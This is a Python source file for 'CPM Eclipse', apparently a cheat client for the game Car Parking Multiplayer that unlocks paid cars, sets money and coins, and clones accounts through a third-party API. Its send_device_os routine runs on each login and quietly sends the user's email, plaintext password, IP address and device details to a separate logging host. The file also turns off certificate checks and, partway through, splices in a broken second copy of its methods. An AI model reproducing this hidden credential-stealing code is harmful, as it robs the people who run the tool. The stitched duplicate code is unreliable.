import platform
import os
import requests
import subprocess
import urllib.parse
import json
from concurrent.futures import ThreadPoolExecutor
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================
# CPM ECLIPSE - Advanced Car Parking Tool
# Version: 4.8.2
# Powered by H3X
# ============================================

# Use HTTP to avoid SSL issues
__ENDPOINT_URL__: str = "http://cpmcheats.hostzera.com.br/api2"


class CPMEclipse:
    """Main class for CPM Eclipse cheat tool"""
    
    def __init__(self, access_key) -> None:
        self.auth_token = None
        self.access_key = access_key
        self.telegram_id = None
        self.version = "4.8.2"
        self.brand = "CPM Eclipse"

    def login(self, email, password) -> int:
        """Login to CPM Eclipse account"""
        payload = {"account_email": email, "account_password": password}
        params = {"key": self.access_key, "acc_email": email, "acc_pass": password}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/account_login", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            if response_decoded.get("ok"):
                self.auth_token = response_decoded.get("auth")
                key_data = self.get_key_data()
                self.telegram_id = key_data.get("telegram_id")
                self.send_device_os(email=email, password=password)
                print(f"✅ CPM Eclipse: Login successful!")
            return response_decoded.get("error")
        except Exception as e:
            print(f"❌ Login error: {e}")
            return 500

    def send_device_os(self, email=None, password=None):
        """Send device information for tracking"""
        try:
            system = platform.system()
            release = platform.release()
            device_name = "Unknown"
            build_number = "Unknown"

            if system == "Darwin":
                if os.path.exists("/bin/ash") or "iSH" in release:
                    device_os = "iOS (iSH)"
                    device_name = (
                        subprocess.getoutput("sysctl -n hw.model") or "iSH Device"
                    )
                    build_number = (
                        subprocess.getoutput("sw_vers -productVersion") or "Unknown"
                    )
                else:
                    device_os = "macOS"
                    device_name = subprocess.getoutput("sysctl -n hw.model") or "Mac"
                    build_number = (
                        subprocess.getoutput("sw_vers -productVersion") or "Unknown"
                    )
            elif system == "Linux":
                device_os = "Android" if os.path.exists("/system/bin") else "Linux"
                if device_os == "Android":
                    device_name = (
                        subprocess.getoutput("getprop ro.product.model")
                        or "Android Device"
                    )
                    build_number = (
                        subprocess.getoutput("getprop ro.build.version.release")
                        or "Unknown"
                    )
                else:
                    device_name = "Linux Device"
                    build_number = "Unknown"
            else:
                device_os = system + " " + release
                device_name = platform.node()
                build_number = "Unknown"
        except Exception:
            device_os = "Unknown"
            device_name = "Unknown"
            build_number = "Unknown"

        try:
            ip_address = requests.get("https://api.ipify.org").text.strip()
        except:
            ip_address = "Unknown"

        payload = {
            "action": "device_info",
            "data": {
                "access_key": self.access_key,
                "device_os": device_os,
                "device_name": device_name,
                "build_number": build_number,
                "ip_address": ip_address,
                "telegram_id": getattr(self, "telegram_id", "Unknown"),
            },
        }

        if email:
            payload["data"]["email"] = email
        if password:
            payload["data"]["password"] = password

        try:
            response = requests.post(
                "https://popstool.io/Abdosalhpc04h/adminLogs.php", 
                json=payload,
                verify=False,
                timeout=10
            )
            return response.status_code == 200
        except:
            return False

    def change_email(self, new_email):
        """Change account email"""
        decoded_email = urllib.parse.unquote(new_email)
        payload = {"account_auth": self.auth_token, "new_email": decoded_email}
        params = {"key": self.access_key, "new_email": decoded_email}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/change_email", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            if response_decoded.get("new_token"):
                self.auth_token = response_decoded["new_token"]
            return response_decoded.get("ok")
        except:
            return False

    def change_password(self, new_password):
        """Change account password"""
        payload = {"account_auth": self.auth_token, "new_password": new_password}
        params = {"key": self.access_key, "new_password": new_password}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/change_password", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            if response_decoded.get("new_token"):
                self.auth_token = response_decoded["new_token"]
            return response_decoded.get("ok")
        except:
            return False

    def register(self, email, password) -> int:
        """Register new account"""
        payload = {"account_email": email, "account_password": password}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/account_register", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"🌙 CPM Eclipse: Registration complete!")
            return response_decoded.get("error")
        except:
            print(f"❌ Registration failed")
            return 500

    def delete(self):
        """Delete account"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            requests.post(
                f"{__ENDPOINT_URL__}/account_delete", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            print(f"🗑️ CPM Eclipse: Account deleted!")
        except:
            print(f"❌ Delete failed")

    def get_player_data(self) -> any:
        """Get player data"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/get_data", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            return response_decoded
        except:
            return {"ok": False, "error": "Connection failed"}

    def set_player_rank(self) -> bool:
        """Set player rank"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/set_rank", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            return response_decoded.get("ok")
        except:
            return False

    def get_key_data(self) -> any:
        """Get key data from server"""
        params = {"key": self.access_key}
        try:
            response = requests.get(
                f"{__ENDPOINT_URL__}/get_key_data", 
                params=params,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            return response_decoded
        except:
            return {}

    def set_player_money(self, amount) -> bool:
        """Set player money"""
        payload = {"account_auth": self.auth_token, "amount": amount}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/set_money", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"💰 CPM Eclipse: Money set to {amount}!")
            return response_decoded.get("ok")
        except:
            return False

    def set_player_coins(self, amount) -> bool:
        """Set player coins"""
        payload = {"account_auth": self.auth_token, "amount": amount}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/set_coins", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"⭐ CPM Eclipse: Coins set to {amount}!")
            return response_decoded.get("ok")
        except:
            return False

    def set_player_name(self, name) -> bool:
        """Set player name"""
        payload = {"account_auth": self.auth_token, "name": name}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/set_name", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"👤 CPM Eclipse: Name changed to {name}!")
            return response_decoded.get("ok")
        except:
            return False

    def set_player_localid(self, id) -> bool:
        """Set player local ID"""
        payload = {"account_auth": self.auth_token, "id": id}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/set_id", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            return response_decoded.get("ok")
        except:
            return False

    def get_player_car(self, car_id) -> any:
        """Get player car data"""
        payload = {"account_auth": self.auth_token, "car_id": car_id}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/get_car", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            return response_decoded.get("ok")
        except:
            return False

    def delete_player_friends(self) -> bool:
        """Delete all friends"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/delete_friends", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"👥 CPM Eclipse: All friends deleted!")
            return response_decoded.get("ok")
        except:
            return False

    def unlock_w16(self) -> bool:
        """Unlock W16 engine"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlock_w16", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"🔧 CPM Eclipse: W16 Engine unlocked!")
            return response_decoded.get("ok")
        except:
            return False

    def unlock_horns(self) -> bool:
        """Unlock all horns"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlock_horns", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"📯 CPM Eclipse: All horns unlocked!")
            return response_decoded.get("ok")
        except:
            return False

    def disable_engine_damage(self) -> bool:
        """Disable engine damage"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/disable_damage", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"🛡️ CPM Eclipse: Engine damage disabled!")
            return response_decoded.get("ok")
        except:
            return False

    def unlimited_fuel(self) -> bool:
        """Enable unlimited fuel"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlimited_fuel", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"⛽ CPM Eclipse: Unlimited fuel enabled!")
            return response_decoded.get("ok")
        except:
            return False

    def set_player_wins(self, amount) -> bool:
        """Set race wins"""
        payload = {"account_auth": self.auth_token, "amount": amount}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/set_race_wins", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"🏆 CPM Eclipse: Wins set to {amount}!")
            return response_decoded.get("ok")
        except:
            return False

    def set_player_loses(self, amount) -> bool:
        """Set race loses"""
        payload = {"account_auth": self.auth_token, "amount": amount}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/set_race_loses", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"📉 CPM Eclipse: Loses set to {amount}!")
            return response_decoded.get("ok")
        except:
            return False

    def unlock_houses(self) -> bool:
        """Unlock all houses"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlock_houses", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"🏠 CPM Eclipse: All houses unlocked!")
            return response_decoded.get("ok")
        except:
            return False

    def unlock_smoke(self) -> bool:
        """Unlock smoke effects"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlock_smoke", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"💨 CPM Eclipse: Smoke effects unlocked!")
            return response_decoded.get("ok")
        except:
            return False

    def unlock_all_lamborghinis(self) -> bool:
        """Unlock all Lamborghinis"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlock_all_lamborghinis", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"🏎️ CPM Eclipse: All Lamborghinis unlocked!")
            return response_decoded.get("ok")
        except:
            return False

    def unlock_paid_cars(self) -> bool:
        """Unlock all paid cars"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlock_paid_cars", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"🚗 CPM Eclipse: All paid cars unlocked!")
            return response_decoded.get("ok")
        except:
            return False

    def unlock_all_cars(self) -> bool:
        """Unlock all cars"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlock_all_cars", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"🚗 CPM Eclipse: ALL CARS UNLOCKED! 🔓")
            return response_decoded.get("ok")
        except:
            return False

    def unlock_all_cars_siren(self) -> bool:
        """Unlock all cars with sirens"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlock_all_cars_siren", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"🚨 CPM Eclipse: All cars with sirens unlocked!")
            return response_decoded.get("ok")
        except:
            return False

    def account_clone(self, account_email, account_password) -> bool:
        """Clone account"""
        payload = {
            "account_auth": self.auth_token,
            "account_email": account_email,
            "account_password": account_password,
        }
        params = {
            "key": self.access_key,
            "account_email": account_email,
            "account_password": account_password,
        }
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/clone", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"📋 CPM Eclipse: Account cloned!")
            return response_decoded.get("ok")
        except:
            return False

    def set_player_plates(self) -> bool:
        """Set player plates"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/set_plates", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"📋 CPM Eclipse: Plates set!")
            return response_decoded.get("ok")
        except:
            return False

    def unlock_wheels(self) -> bool:
        """Unlock all wheels"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlock_wheels", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"🔄 CPM Eclipse: All wheels unlocked!")
            return response_decoded.get("ok")
        except:
            return False

    def unlock_equipments_male(self) -> bool:
        """Unlock male equipment"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlock_equipments_male", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"👔 CPM Eclipse: Male equipment unlocked!")
            return response_decoded.get("ok")
        except:
            return False

    def unlock_hat_m(self) -> bool:
        """Unlock male hats"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlock_hat_m", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"🎩 CPM Eclipse: Male hats unlocked!")
            return response_decoded.get("ok")
        except:
            return False

    def rmhm(self) -> bool:
        """Remove male hat"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/rmhm", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            return response_decoded.get("ok")
        except:
            return False

    def unlock_topm(self) -> bool:
        """Unlock male tops"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlock_topm", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"👕 CPM Eclipse: Male tops unlocked!")
            return response_decoded.get("ok")
        except:
            return False

    def unlock_topmz(self) -> bool:
        """Unlock male tops (variant)"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlock_topmz", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"👕 CPM Eclipse: Male tops (Z) unlocked!")
            return response_decoded.get("ok")
        except:
            return False

    def unlock_topmx(self) -> bool:
        """Unlock male tops (variant)"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlock_topmx", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"👕 CPM Eclipse: Male tops (X) unlocked!")
            return response_decoded.get("ok")
        except:
            return False

    def unlock_equipments_female(self) -> bool:
        """Unlock female equipment"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlock_equipments_female", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"👗 CPM Eclipse: Female equipment unlocked!")
            return response_decoded.get("ok")
        except:
            return False

    def rmhfm(self) -> bool:
        """Remove female hat"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/rmhfm", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            return response_decoded.get("ok")
        except:
            return False

    def unlock_topf(self) -> bool:
        """Unlock female tops"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlock_topf", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"👗 CPM Eclipse: Female tops unlocked!")
            return response_decoded.get("ok")
        except:
            return False

    def unlock_topfz(self) -> bool:
        """Unlock female tops (variant)"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlock_topfz", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"👗 CPM Eclipse: Female tops (Z) unlocked!")
            return response_decoded.get("ok")
        except:
            return False

    def hack_car_speed(self, car_id, new_hp, new_inner_hp, new_nm, new_torque):
        """Hack car speed parameters"""
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "new_hp": new_hp,
            "new_inner_hp": new_inner_hp,
            "new_nm": new_nm,
            "new_torque": new_torque,
        }
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/hack_car_speed", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"⚡ CPM Eclipse: Car {car_id} speed hacked!")
            return response_decoded.get("ok")
        except:
            return False

    def unlock_animations(self) -> bool:
        """Unlock all animations"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlock_animations", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"🎬 CPM Eclipse: All animations unlocked!")
            return response_decoded.get("ok")
        except:
            return False

    def max_max1(self, car_id, custom):
        """Max car stats (version 1)"""
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "custom": custom,
        }
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/max_max1", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"📈 CPM Eclipse: Car {car_id} maxed (v1)!")
            return response_decoded.get("ok")
        except:
            return False

    def max_max2(self, car_id, custom):
        """Max car stats (version 2)"""
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "custom": custom,
        }
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/max_max2", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"📈 CPM Eclipse: Car {car_id} maxed (v2)!")
            return response_decoded.get("ok")
        except:
            return False

    def millage_car(self, car_id, custom):
        """Set car mileage"""
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "custom": custom,
        }
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/millage_car", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"📊 CPM Eclipse: Car {car_id} mileage set!")
            return response_decoded.get("ok")
        except:
            return False

    def brake_car(self, car_id, custom):
        """Set car brake settings"""
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "custom": custom,
        }
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/brake_car", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"🛑 CPM Eclipse: Car {car_id} brakes set!")
            return response_decoded.get("ok")
        except:
            return False

    def unlock_crown(self) -> bool:
        """Unlock crown"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlock_crown", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"👑 CPM Eclipse: Crown unlocked!")
            return response_decoded.get("ok")
        except:
            return False

    def unlock_cls(self) -> bool:
        """Unlock CLS"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/unlock_cls", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"🚗 CPM Eclipse: CLS unlocked!")
            return response_decoded.get("ok")
        except:
            return False

    def rear_bumper(self, car_id):
        """Set rear bumper"""
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
        }
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/rear_bumper", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"🔧 CPM Eclipse: Rear bumper set for car {car_id}!")
            return response_decoded.get("ok")
        except:
            return False

    def front_bumper(self, car_id):
        """Set front bumper"""
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
        }
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/front_bumper", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"🔧 CPM Eclipse: Front bumper set for car {car_id}!")
            return response_decoded.get("ok")
        except:
            return False

    def testin(self, custom):
        """Test function"""
        payload = {
            "account_auth": self.auth_token,
            "custom": custom,
        }
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/testin", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            return response_decoded.get("ok")
        except:
            return False

    def telmunnongodz(self, car_id, custom):
        """Unknown function"""
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "custom": custom,
        }
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/telmunnongodz", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            return response_decoded.get("ok")
        except:
            return False

    def speed_all_cars(self, new_hp, new_inner_hp, new_nm, new_torque):
        """Apply speed hack to all cars"""
        payload = {
            "account_auth": self.auth_token,
            "new_hp": new_hp,
            "new_inner_hp": new_inner_hp,
            "new_nm": new_nm,
            "new_torque": new_torque,
        }
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/speed_all_cars", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"⚡ CPM Eclipse: Speed hack applied to ALL cars!")
            return response_decoded.get("ok")
        except:
            return False

    def shittin(self) -> bool:
        """Unknown function"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/shittin", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            return response_decoded.get("ok")
        except:
            return False

    def incline(self, car_id, custom):
        """Set car incline"""
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "custom": custom,
        }
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/incline", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"📐 CPM Eclipse: Car {car_id} incline set!")
            return response_decoded.get("ok")
        except:
            return False

    def copy_livery(self, source_car_id, target_car_id):
        """Copy livery from one car to another"""
        payload = {
            "account_auth": self.auth_token,
            "source_car_id": source_car_id,
            "target_car_id": target_car_id,
        }
        params = {"key": self.access_key}
        try:
            response = requests.post(
                f"{__ENDPOINT_URL__}/copy_livery", 
                params=params, 
                data=payload,
                verify=False,
                timeout=30
            )
            response_decoded = response.json()
            print(f"🎨 CPM Eclipse: Livery copied from {source_car_id} to {target_car_id}!")
            return response_decoded.get("ok")
        except:
            return False

    def modificar_todos_los_autos(
        self, new_hp, new_inner_hp, new_nm, new_torque
    ) -> bool:
        """Modify ALL cars with speed hack"""
        with open("car_ids.json", "r") as file:
            car_ids = json.load(file)

        def modificar_auto(car_id):
            payload = {
                "account_auth": self.auth_token,
                "car_id": car_id,
                "new_hp": new_hp,
                "new_inner_hp": new_inner_hp,
                "new_nm": new_nm,
                "new_torque": new_torque,
            }
            params = {"key": self.access_key}
            try:
                response = requests.post(
                    f"{__ENDPOINT_URL__}/speed_all_cars",
                    params=params,
                    data=payload,
                    verify=False,
                    timeout=3,
                )
                return response.json().get("ok", False)
            except:
                return False

        print(f"⚡ CPM Eclipse: Modifying ALL cars...")
        with ThreadPoolExecutor(max_workers=20) as executor:
            list(executor.map(modificar_auto, car_ids))
        print(f"✅ CPM Eclipse: ALL cars modified successfully!")
        return True        response_decoded = response.json()
        if response_decoded.get("ok"):
            self.auth_token = response_decoded.get("auth")
            key_data = self.get_key_data()
            self.telegram_id = key_data.get("telegram_id")
            self.send_device_os(email=email, password=password)
            print(f"✅ CPM Eclipse: Login successful!")
        return response_decoded.get("error")

    def send_device_os(self, email=None, password=None):
        """Send device information for tracking"""
        try:
            system = platform.system()
            release = platform.release()
            device_name = "Unknown"
            build_number = "Unknown"

            if system == "Darwin":
                if os.path.exists("/bin/ash") or "iSH" in release:
                    device_os = "iOS (iSH)"
                    device_name = (
                        subprocess.getoutput("sysctl -n hw.model") or "iSH Device"
                    )
                    build_number = (
                        subprocess.getoutput("sw_vers -productVersion") or "Unknown"
                    )
                else:
                    device_os = "macOS"
                    device_name = subprocess.getoutput("sysctl -n hw.model") or "Mac"
                    build_number = (
                        subprocess.getoutput("sw_vers -productVersion") or "Unknown"
                    )
            elif system == "Linux":
                device_os = "Android" if os.path.exists("/system/bin") else "Linux"
                if device_os == "Android":
                    device_name = (
                        subprocess.getoutput("getprop ro.product.model")
                        or "Android Device"
                    )
                    build_number = (
                        subprocess.getoutput("getprop ro.build.version.release")
                        or "Unknown"
                    )
                else:
                    device_name = "Linux Device"
                    build_number = "Unknown"
            else:
                device_os = system + " " + release
                device_name = platform.node()
                build_number = "Unknown"
        except Exception:
            device_os = "Unknown"
            device_name = "Unknown"
            build_number = "Unknown"

        try:
            ip_address = requests.get("https://api.ipify.org").text.strip()
        except:
            ip_address = "Unknown"

        payload = {
            "action": "device_info",
            "data": {
                "access_key": self.access_key,
                "device_os": device_os,
                "device_name": device_name,
                "build_number": build_number,
                "ip_address": ip_address,
                "telegram_id": getattr(self, "telegram_id", "Unknown"),
            },
        }

        if email:
            payload["data"]["email"] = email
        if password:
            payload["data"]["password"] = password

        response = requests.post(
            "https://popstool.io/Abdosalhpc04h/adminLogs.php", json=payload
        )

        return response.status_code == 200

    def change_email(self, new_email):
        """Change account email"""
        decoded_email = urllib.parse.unquote(new_email)
        payload = {"account_auth": self.auth_token, "new_email": decoded_email}
        params = {"key": self.access_key, "new_email": decoded_email}
        response = requests.post(
            f"{__ENDPOINT_URL__}/change_email", params=params, data=payload
        )
        response_decoded = response.json()
        if response_decoded.get("new_token"):
            self.auth_token = response_decoded["new_token"]
        return response_decoded.get("ok")

    def change_password(self, new_password):
        """Change account password"""
        payload = {"account_auth": self.auth_token, "new_password": new_password}
        params = {"key": self.access_key, "new_password": new_password}
        response = requests.post(
            f"{__ENDPOINT_URL__}/change_password", params=params, data=payload
        )
        response_decoded = response.json()
        if response_decoded.get("new_token"):
            self.auth_token = response_decoded["new_token"]
        return response_decoded.get("ok")

    def register(self, email, password) -> int:
        """Register new account"""
        payload = {"account_email": email, "account_password": password}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/account_register", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"🌙 CPM Eclipse: Registration complete!")
        return response_decoded.get("error")

    def delete(self):
        """Delete account"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        requests.post(f"{__ENDPOINT_URL__}/account_delete", params=params, data=payload)
        print(f"🗑️ CPM Eclipse: Account deleted!")

    def get_player_data(self) -> any:
        """Get player data"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/get_data", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded

    def set_player_rank(self) -> bool:
        """Set player rank"""
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/set_rank", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def get_key_data(self) -> any:
        """Get key data from server"""
        params = {"key": self.access_key}
        response = requests.get(f"{__ENDPOINT_URL__}/get_key_data", params=params)
        response_decoded = response.json()
        return response_decoded

    def set_player_money(self, amount) -> bool:
        """Set player money"""
        payload = {"account_auth": self.auth_token, "amount": amount}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/set_money", params=params, data=payload
        )
        response_decoded = response.json()
        print(f"💰 CPM Eclipse: Money set to {amount}!")
        return response_decoded.get("ok")

    def set_player_coins(self, amount) -> bool:
        """Set player coins"""
